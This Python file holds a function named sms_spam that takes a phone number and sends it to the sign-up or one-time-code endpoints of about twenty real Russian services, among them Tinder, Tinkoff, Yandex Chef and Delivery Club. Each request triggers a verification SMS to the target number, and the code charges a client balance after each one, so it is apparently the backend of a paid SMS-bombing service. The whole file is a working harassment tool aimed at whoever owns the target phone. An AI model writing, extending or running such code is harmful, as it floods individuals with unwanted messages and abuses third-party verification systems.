import requests
from requests.exceptions import ConnectionError as ReqConnectionError


def sms_spam(phone, client, session):
    price = 0.01
    try:
        requests.post('https://app.karusel.ru/api/v1/phone/', data = {"phone":phone}, headers = {'Accept-Language': 'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3', 'Connection': 'keep-alive', 'Host': 'app.karusel.ru', 'origin': 'https://karusel.ru', 'Referer': 'https://karusel.ru/registration'})
        client.decrease_money(price, session)
    except ReqConnectionError:
        print('ReqConnectionError')
    except:
        print('other exception')

    try:
        requests.post('https://api.mtstv.ru/v1/users', data = {"msisdn":phone}, headers = {'Accept-Language': 'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3', 'Connection': 'keep-alive', 'Host': 'api.mtstv.ru', 'origin': 'https://www.mtstv.ru', 'Referer': 'https://www.mtstv.ru/?popup=auth&tab=reg'})
        client.decrease_money(price, session)
    except ReqConnectionError:
        print('ReqConnectionError')
    except:
        print('other exception')

    try:
        requests.post('https://www.maxidom.ru/ajax/doRegister.php?RND=0.6416262061536506',data = {"REGISTER_PHIS[LOGIN]":"asaofjkiawhwjk@mail.ru","REGISTER_PHIS[PHONE]":"a","REGISTER_PHIS[PASSWORD]":"asaofjkiawhwjk@mail.ru","REGISTER_PHIS[RULES]":"Y"},headers = {'Accept-Language':'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3', 'Connection':'keep-alive', 'Host':'www.maxidom.ru', 'origin':'https://www.maxidom.ru/','Referer':'https://www.maxidom.ru/ajax/doRegister.php?RND=0.6416262061536506'})
        client.decrease_money(price, session)
    except ReqConnectionError:
        print('ReqConnectionError')
    except:
        print('other exception')
    try:
        requests.post('https://ostin.com/ru/ru/secured/myaccount/myclubcard/resultClubCard.jsp?type=sendConfirmCode&phoneNumber=%207%20(982)143-26-46', data = {"phoneNumer":phone}, headers = {'Accept-Language': 'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3', 'Connection': 'keep-alive', 'Host': 'ostin.com', 'origin': 'https://ostin.com/', 'Referer': 'https://ostin.com/'})
        client.decrease_money(price, session)
    except ReqConnectionError:
        print('ReqConnectionError')
    except:
        print('other exception')
    try:
        requests.post('https://youla.ru/web-api/auth/request_code', data = {"phone":phone}, headers = {'Accept-Language': 'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3', 'Connection': 'keep-alive', 'Host': 'youla.ru', 'origin': 'https://youla.ru', 'Referer': 'https://youla.ru/surgut'})
        client.decrease_money(price, session)
    except ReqConnectionError:
        print('ReqConnectionError')
    except:
        print('other exception')
    try:
        requests.post('https://api.ennergiia.com/auth/api/development/lor', data = {"phone":phone, "referrer": "ennergiia", "via_sms": "true"}, headers = {'Accept-Language': 'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3', 'Connection': 'keep-alive', 'Host': 'api.ennergiia.com', 'origin': 'https://www.ennergiia.com', 'Referer': 'https://www.ennergiia.com/auth'})
        client.decrease_money(price, session)
    except ReqConnectionError:
        print('ReqConnectionError')
    except:
        print('other exception')
    try:
        requests.post('https://beta.delivery-club.ru/api/user/otp', data = {"phone":phone}, headers = {'Accept-Language': 'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3', 'Connection': 'keep-alive', 'Host': 'beta.delivery-club.ru', 'origin': 'https://beta.delivery-club.ru', 'Referer': 'https://beta.delivery-club.ru/entities/food?authPopupOpened=1'})
        client.decrease_money(price, session)
    except ReqConnectionError:
        print('ReqConnectionError')
    except:
        print('other exception')
    try:
        requests.post('https://radugavkusaufa.ru/?action=auth&act=132', data = {"CSRF":"","ACTION":"REGISTER","MODE":"PHONE","PHONE":phone, "PASSWORD": "791911534661128", "PASSWORD2": "791911534661128", }, headers = {'Accept-Language': 'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3', 'Connection': 'keep-alive', 'Host': 'radugavkusaufa.ru', 'origin': 'https://radugavkusaufa.ru', 'Referer': 'https://radugavkusaufa.ru/'})
        client.decrease_money(price, session)
    except ReqConnectionError:
        print('ReqConnectionError')
    except:
        print('other exception')
    try:
        requests.post('https://api.sunlight.net/v3/customers/authorization/', data = {"phone":phone}, headers = {'Accept-Language': 'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3', 'Connection': 'keep-alive', 'Host': 'api.sunlight.net', 'origin': 'https://sunlight.net/', 'Referer': 'https://sunlight.net/profile/login/?next=/profile/'})
        client.decrease_money(price, session)
    except ReqConnectionError:
        print('ReqConnectionError')
    except:
        print('other exception')
    try:
        requests.post('https://online.sbis.ru/reg/service/?x_version=19.412.b-40', data = {"phone":phone}, headers = {'Accept-Language': 'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3', 'Connection': 'keep-alive', 'Host': 'online.sbis.ru', 'origin': 'https://online.sbis.ru', 'Referer': 'https://online.sbis.ru/auth/?ret=%2F&tab=register&regType=personal'})
        client.decrease_money(price, session)
    except ReqConnectionError:
        print('ReqConnectionError')
    except:
        print('other exception')
    try:
        requests.post('https://api-user.privetmir.ru/api/send-code', data = {"back_url":"/register/step-2/","scope":"register-user","login":phone, "checkExist": "Y", "checkApproves": "Y", "approve1": "on", "approve2": "on"}, headers = {'Accept-Language': 'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3', 'Connection': 'keep-alive', 'Host': 'api-user.privetmir.ru', 'origin': 'https://privetmir.ru/', 'Referer': 'https://privetmir.ru/register/'})
        client.decrease_money(price, session)
    except ReqConnectionError:
        print('ReqConnectionError')
    except:
        print('other exception')
    try:
        requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data = {"phone_number":phone}, headers = {'Accept-Language': 'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3', 'Connection': 'keep-alive', 'Host': 'api.gotinder.com', 'origin': 'https://tinder.com/?lang=ru', 'Referer': 'https://tinder.com/?lang=ru'})
        client.decrease_money(price, session)
    except ReqConnectionError:
        print('ReqConnectionError')
    except:
        print('other exception')
    try:
        requests.post('https://api.tinkoff.ru/v1/sign_up?origin=web%2Cib5%2Cplatform&sessionid=RznyziZkeagDbs6SLIr13ZlfSjusxJbQ.m1-prod-api26&wuid=31ad89052c4944fd8cd55bcf419eefc1', data = {"phone":phone}, headers = {'Accept-Language': 'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3', 'Connection': 'keep-alive', 'Host': 'api.tinkoff.ru', 'origin': 'https://www.tinkoff.ru', 'Referer': 'https://www.tinkoff.ru/login/'})
        client.decrease_money(price, session)
    except ReqConnectionError:
        print('ReqConnectionError')
    except:
        print('other exception')
    try:
        requests.post('https://api.chef.yandex/api/v2/auth/sms', data = {"phone":phone}, headers = {'Accept-Language': 'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3', 'Connection': 'keep-alive', 'Host': 'api.chef.yandex', 'origin': 'https://chef.yandex/', 'Referer': 'https://chef.yandex/login'})
        client.decrease_money(price, session)
    except ReqConnectionError:
        print('ReqConnectionError')
    except:
        print('other exception')
    try:
        requests.post('https://register.sipnet.ru/cgi-bin/exchange.dll/RegisterHelper?oper=9&phone=79821432646', data = {"phone":phone, "oper": "9"}, headers = {'Accept-Language': 'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3', 'Connection': 'keep-alive', 'Host': 'register.sipnet.ru', 'origin': 'https://www.sipnet.ru/', 'Referer': 'https://www.sipnet.ru/tarify-ip-telefonii'})
        client.decrease_money(price, session)
    except ReqConnectionError:
        print('ReqConnectionError')
    except:
        print('other exception')
    try:
        requests.post('https://api.ivi.ru/mobileapi/user/register/phone/v6/', data = {"phone":phone}, headers = {'Accept-Language': 'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3', 'Connection': 'keep-alive', 'Host': 'api.ivi.ru', 'origin': 'https://www.ivi.ru/', 'Referer': 'https://www.ivi.ru/profile'})
        client.decrease_money(price, session)
    except ReqConnectionError:
        print('ReqConnectionError')
    except:
        print('other exception')
    try:
        requests.post('https://rutube.ru/api/accounts/sendpass/phone?phone=%2B79195346628', data = {"phone":phone}, headers = {'Accept-Language': 'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3', 'Connection': 'keep-alive', 'Host': 'rutube.ru', 'origin': 'https://rutube.ru', 'Referer': 'https://rutube.ru/'})
        client.decrease_money(price, session)
    except ReqConnectionError:
        print('ReqConnectionError')
    except:
        print('other exception')
    try:
        requests.post('https://koronapay.com/transfers/online/api/users/otps', data = {"phone":phone}, headers = {'Accept-Language': 'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3', 'Connection': 'keep-alive', 'Host': 'koronapay.com', 'origin': 'https://koronapay.com', 'Referer': 'https://koronapay.com/transfers/online/login'})
        client.decrease_money(price, session)
    except ReqConnectionError:
        print('ReqConnectionError')
    except:
        print('other exception')
    try:
        requests.post('https://client.taximaxim.com/site/send-code/?type=0', data = {"_csrf":"SuyaDpUnfWWvTkF8GytL1zAJqUUvLMc_SUXaEGhXsoQa2tJvwF8nC_YJEQpaHhKkVGCRIhljrggQJ4ljCW-G4Q==","LoginForm[org]":"maxim","LoginForm[country]":"ru","LoginForm[baseId]":"11","LoginForm[phone]":phone, "LoginForm[code]": "", "LoginForm[agree]": "0"}, headers = {'Accept-Language': 'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3', 'Connection': 'keep-alive', 'Host': 'client.taximaxim.com', 'origin': 'https://client.taximaxim.com', 'Referer': 'https://client.taximaxim.com/login/'})
        client.decrease_money(price, session)
    except ReqConnectionError:
        print('ReqConnectionError')
    except:
        print('other exception')

